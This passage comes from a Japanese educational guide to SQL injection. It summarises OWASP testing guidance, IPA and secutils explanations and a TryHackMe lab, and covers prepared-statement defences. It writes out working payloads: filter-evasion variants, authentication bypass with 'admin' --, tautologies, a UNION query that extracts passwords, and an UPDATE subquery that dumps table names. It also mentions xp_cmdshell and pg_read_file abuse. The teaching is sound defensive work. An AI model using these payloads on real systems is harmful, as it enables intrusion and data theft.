- **16進数エンコード**: `unhex('726F6F74')`のように16進表現を使う
- **変数宣言**: `declare @SQLivar nvarchar(80); set @SQLivar = N'UNI' + N'ON' + ...`のように、注入文字列を一度変数に分割代入してから`EXEC()`で実行する
- **`OR 1=1`の別表現**: `'SQLi' = 'SQL'+'i'`、`20 > 1`、`2 between 3 and 1`、`1 || 1 = 1`など、同じ論理的帰結を多様な構文で表現し、特定パターンのブロックリストを回避する

これらはいずれも「ブラックリスト方式の入力検証はSQLの表現力の豊かさに対して原理的に不完全である」というOWASP Communityページの主張を、テスターの視点から裏づける実例集になっている。

#### SQLワイルドカードインジェクション

見落とされがちな観点として、WSTGは`LIKE`演算子で使われるワイルドカード文字（`%`、`_`など）の注入にも触れている。たとえパラメータ化クエリでSQLi自体が防がれていても、ユーザー入力がそのまま`LIKE`の引数に渡される設計だと、`%`を入力するだけで全レコードにマッチしてしまう。

```sql
SELECT * FROM discount_codes WHERE code LIKE ':code'
```

`:code`に`%`を渡せば、本来存在確認のためのクエリであるにもかかわらず、すべての割引コードにマッチしてしまう。さらに`a%`、`ba%`のように徐々に具体化していくことで、正確な値を推測的に絞り込むことも可能だとWSTGは指摘している。これはSQLi対策（プレースホルダ）が講じられていても発生しうる、隣接した論理的欠陥である点に注意したい。

#### 是正策・ツール・参考資料

WSTGは是正策として、OWASP Cheat Sheet SeriesのSQL Injection Prevention Cheat SheetとDatabase Security Cheat Sheetを直接参照するよう案内している。ツールとしては、業界標準の自動化ツールであるsqlmap、fuzzdbのペイロード集、PayloadsAllTheThingsのSQL Injectionセクションなどが挙げられている。

また、WSTGはDBMSごとの個別ガイド（Oracle、MySQL、SQL Server、PostgreSQL、MS Access、NoSQL、ORM、Client-side）を別ページとして用意している。たとえばSQL Server編では`xp_cmdshell`という拡張ストアドプロシージャ経由でOSコマンドを実行する手口（`sysadmin`権限が必要で、SQL Server 2005以降はデフォルト無効。`sp_configure`で再有効化される事例がある）が、PostgreSQL編では`pg_sleep(n)`（PostgreSQL 8.2以降で標準搭載）を使った時間遅延ブラインド技術や、`COPY`文・`pg_read_file()`によるファイル読み取りが、それぞれDBMS固有の関数・構文とともに詳述されている。DBMSごとに攻撃対象領域が異なるため、フィンガープリンティングで特定したDBMSに応じて、該当する個別ガイドを参照するのが実務上の定石である。

### 2つの資料の関係のまとめ

OWASP CommunityページのSQL Injection記事が「概念・定義・影響」という静的な知識を提供するのに対し、WSTGのTesting for SQL Injectionは「その概念をどう能動的に検証するか」という動的な手順を提供する。前者を読むことでSQLiが「なぜ危険で、なぜ起こるのか」を理解し、後者を読むことで「実際にどう検出し、どこまで深刻度を評価するのか」を学べる。この2つは対になっており、脆弱性クラスを学ぶ際の標準的な読み方——概念定義（Community/Top10系ドキュメント）→ テスト方法論（WSTG）→ 防御策（Cheat Sheet Series）——の最初の2段階を構成している。次節以降では、この方法論を踏まえた上で、具体的なDBMSごとの実装差異や、より実践的な悪用シナリオを扱っていく。

## やさしいハンズオンと日本語入門

これまでの節でSQLインジェクション（以下SQLi）の背景を押さえた読者に向けて、この節では「なぜ動くのか」という仕組みを日本語の権威ある一次情報（IPA・secutils）で固めたうえで、実際に手を動かして体験できるガイド付きラボ（TryHackMe「SQL Injection Lab」）がどのような教材設計になっているかを紹介する。基礎は既知の読者を想定しているため、用語の初出解説は最小限に留めつつ、内部動作のレベルまで踏み込んで説明する。

### メンタルモデル：クエリ文字列は「命令」と「データ」の混成物である

Webアプリケーションがデータベース（DB）へアクセスする典型的な流れは、次の3ステップに整理できる。

1. 利用者の入力（フォーム値、URLパラメータ、Cookie、HTTPヘッダなど）を受け取る
2. その入力値を使ってSQL文の文字列を組み立てる
3. 組み立てたSQL文をDBエンジンに送り、DB側のパーサ（構文解析器。文字列をトークン列に分解し、構文木を組み立てる処理系）がそれを命令として実行する

問題の核心はステップ2にある。「命令の骨格（`SELECT`・`WHERE`・`AND` などのキーワードやテーブル名・カラム名）」と「利用者が入力した値」を同じ1本の文字列として結合してしまうと、DB側のパーサはその文字列のどこまでが構文でどこからが単なる値なのかを、文字列中の区切り記号（クォート、コメント記号など）から判断するしかなくなる。つまり、**構文と値の境界情報が、文字列そのものの中身に依存してしまう**。攻撃者が入力値の中に `'`（シングルクォート）や `--`（行コメント開始）のような構文上特別な意味を持つ文字を混ぜれば、パーサはそれを「データ」ではなく「命令の続き」として解釈してしまう。これがSQLiの原理であり、この節全体を貫く核心の主張である。入力が最終的に危険な形でSQL文へ流れ込む代入先を「sink（シンク）」と呼ぶなら、この文字列連結の処理そのものがsinkであり、そこに未検証・未分離の入力が到達することが脆弱性の本質となる。

### 危険なコード：文字列連結によるクエリ構築（secutils.jp）

secutils.jpの入門解説は、この仕組みをPHPの最小コード例で明快に示している。

```php
// ❌ 危険なコード
$id = $_POST['id'];
$pw = $_POST['pw'];
$sql = "SELECT * FROM users WHERE id = '" . $id . "' AND pw = '" . $pw . "'";
```

> 出典: secutils SQLインジェクション入門 — https://secutils.jp/learn/security/sql-injection

このコードは、利用者入力である `$id` と `$pw` を、SQL文のテンプレート文字列にそのまま文字列連結している。`id` パラメータに `admin' --` という値を送ると、生成される文字列は次のようになる。

```sql
SELECT * FROM users WHERE id = 'admin' --' AND pw = '...'
```

なぜこれで認証が突破できるのか、仕組みを分解する。

- `admin'` の末尾の `'` が、`id = '` の時点で開いていたシングルクォートを閉じる。パーサは「文字列リテラル `admin` がここで終わった」と認識する。
- 続く `--` は、MySQL・PostgreSQL・SQL Serverなど多くのSQL方言で「行末までをコメントとして無視する」構文である（方言によっては `--` の直後にスペースが必要、あるいは `#` を使うなど差異があるが、原理は共通している）。パーサはそれ以降の `' AND pw = '...'` を丸ごと読み飛ばす。
- 結果として実行される命令は実質的に `SELECT * FROM users WHERE id = 'admin'` だけになり、パスワード照合の条件式そのものが消滅する。パスワードを一切知らなくても、`id` が `admin` である行が1件でも存在すれば認証を通過できてしまう。

ここで異常なのは、「入力値の中身によってSQL文の構文構造そのものが変化した」という点である。本来、値はどんな文字列であっても常に「値」として扱われるべきであり、命令の形を左右してはならない。この崩れが起きる根本原因は、アプリケーション側がDBエンジンに渡す最終的な文字列を組み立てる際に、「命令」と「値」をあらかじめ区別しないまま1本の文字列に一体化させてしまうことにある。

### 防御の原理：プレースホルダ（準備された文）はなぜ効くのか（IPA / secutils）

IPA（情報処理推進機構）の「安全なウェブサイトの作り方」は、SQLiの根本的解決策として「プレースホルダ」の使用を最上位に位置づけている。原文の表現では、プレースホルダとは「SQL文の雛形の中に変数の場所を示す記号（プレースホルダ）を置いて、後に、そこに実際の値を機械的な処理で割り当てるもの」とされる。IPAはこれをさらに2種類に分けて説明しており、DBエンジン側で値の割り当てを行う「静的プレースホルダ」が、アプリケーション側でエスケープ処理を伴って割り当てを行う「動的プレースホルダ」よりも原理的に優れているとしている。静的プレースホルダは、SQLの国際規格上「準備された文（Prepared Statement）」と呼ばれる仕組みに対応する。

> 出典: IPA「安全なウェブサイトの作り方」SQLインジェクション対策 — https://www.ipa.go.jp/security/vuln/websecurity/sql.html

secutils.jpは、この原理を複数言語の具体的なコードで示している。

```php
// PHP / PDO（安全なコード）
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ? AND pw = ?");
$stmt->execute([$id, $pw]);
```

> 出典: secutils SQLインジェクション入門 — https://secutils.jp/learn/security/sql-injection

なぜこれで安全になるのか、文字列連結との違いを内部動作のレベルで整理する。

1. **構文の確定が値の受け渡しより先に起きる。** `prepare()` を呼んだ時点で、アプリケーションはDBエンジンに対して「これから実行する命令の構文構造（骨格）」だけを渡す。DBエンジン側のパーサは、この段階で `?`（あるいは `$1` などの記法）を「後から値が入る穴（パラメータプレースホルダ）」として認識し、SQL構文木（実行計画のもとになる内部表現）をこの時点で確定させてしまう。
2. **値は別チャネルで送られ、構文解析の対象にならない。** `execute()` に渡される `$id`, `$pw` などの実データは、確定済みの構文木にあとから「値」としてバインド（結びつけ）されるだけであり、DBエンジンの構文解析器を二度通ることがない。つまり、値の中に `'` や `--` のような文字が含まれていても、それらは「文字列という値の中身」としてそのまま扱われ、構文上のクォート終端やコメント開始としては一切解釈されない。
3. **したがって「値によって命令の構造が変わる」という現象自体が原理的に起こり得ない。** これが、単なる「クォートのエスケープ」より静的プレースホルダが優れているとIPAが位置づける理由である。エスケープ処理（文字列連結を維持したまま `'` を `''` に、`\` を `\\` に変換するような方式）は、DB製品ごとのエスケープ規則、文字コード設定（例えば古いMySQLで `SET NAMES GBK` のようなマルチバイト文字コード設定を利用してエスケープをすり抜ける攻撃が過去に知られている）、実装者の取りこぼしに依存する、実装依存の対策である。プレースホルダは構文と値を経路レベルで分離するため、そもそも「取りこぼす」という概念が発生しにくい。

なお、テーブル名やカラム名、`ORDER BY` の並び順のように、プレースホルダで置き換えられない「識別子」を動的に扱う必要がある場合は、値ではなく識別子そのものが可変になるため、プレースホルダは使えない。この場合はホワイトリスト（許可された識別子の一覧）と厳密な突き合わせで対応するのが定石であり、プレースホルダが「値の受け渡し」専用の仕組みであることを裏から理解する材料になる。

IPAはこのほか、根本対策と併用すべき保険的対策（多層防御）として次の2点を挙げている。

- **エラーメッセージの制御**: 原文の表現では、エラーメッセージは「攻撃の手がかりを与えるだけでなく、実際に攻撃された結果を表示する情報源として悪用される」おそれがあるとされる。詳細なDBエラー（SQL構文エラーの内容やテーブル構造の断片）を画面にそのまま出力すると、攻撃者はエラーメッセージを観測しながらクエリ構造を推測できてしまう。これは次章以降で扱うエラーベースSQLiやブラインドSQLiの糸口になる。
- **データベースアカウントに与える権限の最小化**: 「ウェブアプリケーションがデータベースに接続する際に使用するアカウントの権限が必要以上に高い場合、攻撃による被害が深刻化する恐れ」があるとされる。アプリ用DBアカウントには、実際に必要な最小限の権限（例えば読み取り専用ビューへの `SELECT` のみ）だけを与え、`DROP` や管理者相当の権限、他スキーマへのアクセス権は与えない設計にする。

IPAが挙げるSQLiの帰結（脅威）も整理しておく。原文では「情報漏えい（データベースに蓄積された非公開情報の閲覧）」「データ改ざん（データベースに蓄積された情報の改ざん、消去）」「認証回避」「ストアドプロシージャ等を利用したOSコマンドの実行によるシステム乗っ取り」が挙げられている。SQLiは単に「ログインを抜けられる」バグにとどまらず、DBを踏み台にしたホスト侵害（場合によってはリモートコード実行にまで連鎖する）に至りうる、影響範囲の広い脆弱性クラスであることを押さえておきたい。またIPAの統計では、SQLi脆弱性はウェブサイトの届出件数のうち相当な割合（原文では11%程度）を占めており、決して過去の遺物ではなく現在も継続的に報告され続けているクラスであるという点も、優先順位づけの参考になる。

### ガイド付きハンズオンとしてのTryHackMe「SQL Injection Lab」

原理を確認できたところで、実際に手を動かして体験する場として、TryHackMeの `SQL Injection Lab`（`tryhackme.com/room/sqlilab`）は初心者〜中級者向けに設計された代表的な学習ルームである。学習目標は「SQLiがどのように動作し、どう悪用されるかを理解すること」で、基礎的な注入から、認証バイパス、DB列挙、パスワード変更機能の脆弱性の悪用まで、段階的に難度を引き上げる構成になっている。

このルームで扱われる技法は、前節までの原理（構文と値の混成、コメントによる後続クエリの無効化）が、実際のパラメータ型やクエリの位置によってどう表れ方を変えるかを体験させる設計になっている。代表的なパターンを、原理の説明とともに整理する（下記は許可されたラボ環境内でのみ試すべきものであり、無許可の対象に対して同様の操作を行ってはならない）。

**1. 数値パラメータへの注入（クォート不要のコンテキスト）**

```
1 or 1=1-- -
```

`WHERE id = 1 or 1=1-- -` のように、整数として扱われるパラメータにクォートで囲まれない値がそのまま連結される実装では、シングルクォートを使わずとも `or 1=1` のような「常に真になる条件」を注入するだけで `WHERE` 句全体が恒真になる。末尾の `-- -`（ハイフン2つの後にスペースとハイフン。DB方言によっては単に `--` や `#` でも同義）は、後続に続く可能性のある構文（閉じクォートやLIMIT句など）をコメントアウトして構文エラーを防ぐための定番のイディオムである。

**2. 文字列パラメータへの注入（クォートで囲まれたコンテキスト）**

```
1' or '1'='1'-- -
```

同種の脆弱性を、`WHERE id = '1'` のようにシングルクォートで囲まれた文字列コンテキストで再現したものである。先頭の `1'` で開始クォートを早期に閉じ、`or '1'='1'` という恒真式を差し込んだうえで、末尾の `-- -` で残りの構文（閉じクォートや `AND` 条件）を無効化する。数値コンテキストと文字列コンテキストとでは、注入に必要なクォートの有無が変わる点を体験できる、教材として典型的な対比である。

**3. UNIONベースの情報取得**

```sql
' UNION SELECT 1,group_concat(password) FROM users-- -
```

`UNION` 演算子は、2つの `SELECT` 結果セットを縦に結合する標準SQLの機能である。アプリケーションが元々表示するつもりだった検索結果や一覧表示のクエリに対して、攻撃者は `UNION SELECT` で別のテーブル（例えば `users`）から任意の列を選択し、同じ表示領域に流し込むことで、本来見えるはずのないデータを画面に出力させる。これが成立するための条件は、（a）元クエリと注入する `SELECT` の列数が一致していること、（b）各列のデータ型が表示可能な形で揃っていることであり、`group_concat()`（複数行の値をカンマ区切りの1文字列に連結するSQLite/MySQL系の集約関数）はこの列数制約を回避しつつ複数レコードを1列にまとめて抜き出す常套手段として使われる。

**4. UPDATE文への注入によるデータ抽出**

ログイン画面以外にも、ニックネームやプロフィールの更新機能のような `UPDATE` 文が注入対象になりうる。例えば次のような形で、`UPDATE` の代入値の中にサブクエリを埋め込み、その結果を後で自分のプロフィール画面から読み取るという手法が使われる。

```sql
', nickName = (SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table')-- -
```

これは「画面に直接クエリ結果が表示されない代わりに、別の読み取り可能な出力先（この場合は自分のプロフィール欄）に結果を書き写す」という発想であり、UNIONベースが使えない書き込み系クエリでも情報を抜き出せることを示す実践的な例である。

**5. ブラインドSQLi（真偽だけを手がかりにした推測）**

画面にエラーメッセージやクエリ結果が直接表示されない状況では、条件式の真偽によってレスポンスの内容やステータス、あるいは応答時間が変化するかどうかだけを手がかりに、DB内の値を1文字（あるいは1ビット）ずつ推測していく。これはIPAが指摘する「エラーメッセージの制御」という保険的対策が、なぜブラインド攻撃に対する抑止として重要なのかを裏側から理解させる課題設計になっている。このルームでは自動化ツール（SQLMapなど）の利用も選択肢として示唆されている。

このように `SQL Injection Lab` は、「クォート不要な数値コンテキストでの注入 → 文字列コンテキストでの注入 → UNIONによる横断的なデータ取得 → UPDATE文を使った書き込み系の悪用 → ブラインド抽出」という、実際の脆弱性診断やバグバウンティ調査でたどる思考プロセスに近い順序で構成されている。読者はこの節で得たメンタルモデル（クエリは命令とデータの混成物であり、パーサがそれをどう区別するかがすべての鍵になる）を携えて、許可されたラボ環境の中でこの流れを自分の手で確認することを強く推奨する。

> 出典: TryHackMe「SQL Injection Lab」 — https://tryhackme.com/room/sqlilab

### この節のまとめ

- SQLiは、アプリケーションが「命令の骨格」と「利用者データ」を1本の文字列として結合し、DB側のパーサにその区別を委ねてしまうことから生じる。`'` や `--` のような構文上特別な意味を持つ文字を値の中に紛れ込ませると、パーサは「データ」を「命令の続き」として読み替えてしまう。
- 根本対策は静的プレースホルダ（準備された文）であり、これは構文の確定と値の受け渡しを経路レベルで分離することで、値の中身がどうであっても構文解釈の対象にならないようにする仕組みである。テーブル名・カラム名など識別子が可変になる場合はプレースホルダが使えないため、ホワイトリストで対応する。
- エラーメッセージの制御と最小権限の原則は、根本対策を補完する保険的対策であり、特にブラインドSQLiのような手探りの攻撃の効率を下げる意味を持つ。
- SQLiの帰結は情報漏えい・データ改ざん・認証回避・OSコマンド実行によるシステム乗っ取りにまで及び、単なるログインバイパスにとどまらない広い影響範囲を持つ。
- TryHackMe「SQL Injection Lab」のようなガイド付きハンズオン環境は、数値コンテキスト・文字列コンテキスト・UNIONベース・UPDATE文への注入・ブラインド抽出という段階的な流れで、原理を実際の手触りとして体験させてくれる。次章以降では、これらの技法（UNIONベース、ブラインド、OOB/OASTなど）をそれぞれ独立した章として深掘りしていく。
